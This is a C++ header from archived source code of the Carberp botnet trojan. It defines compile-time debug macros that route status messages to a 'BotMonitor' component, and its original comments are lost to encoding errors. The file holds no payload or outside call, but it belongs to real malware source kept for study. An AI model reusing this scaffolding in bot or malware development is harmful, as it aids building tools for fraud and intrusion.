/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */

//****************************************************************************
//  ������� ��� ��������� ������ � ��������� �����������������
//****************************************************************************

#include "windows.h"

#ifdef BOTMONITOR
	#include "BotMonitorConsts.h"
#endif



// ������ ��������� ��������� ��������
#ifdef BOTMONITOR
	#define BMCONST(ConstName) BotMonitor::ConstName
#else
	#define BMCONST(ConstName) NULL
#endif



// ������� ������ ���������
template <class MESSAGE, class DATA>
inline void OutMonitorMessage(MESSAGE Message, DATA Data)
{
	#ifdef BOTMONITOR
		BotMonitor::SendMessage((PCHAR)Message, (PCHAR)Data, 0);
	#endif
}

// ������� ������ ���������
template <class MESSAGE, class ARG1, class DELIMETER, class ARG2>
inline void OutMonitorDelimetedMessage(MESSAGE Message, ARG1 Arg1, DELIMETER Delimeter, ARG2 Arg2)
{
	#ifdef BOTMONITOR
		PCHAR S = STR::New(3, (PCHAR)Arg1, (PCHAR)Delimeter, (PCHAR)Arg2);
		BotMonitor::SendMessage((PCHAR)Message, S, 0);
		STR::Free(S);
	#endif
}

// ������� ������ ��������� �������� �����������������
#define MONITOR_MSG OutMonitorMessage<>
#define MONITOR_DELIMETED_MSG OutMonitorDelimetedMessage<>


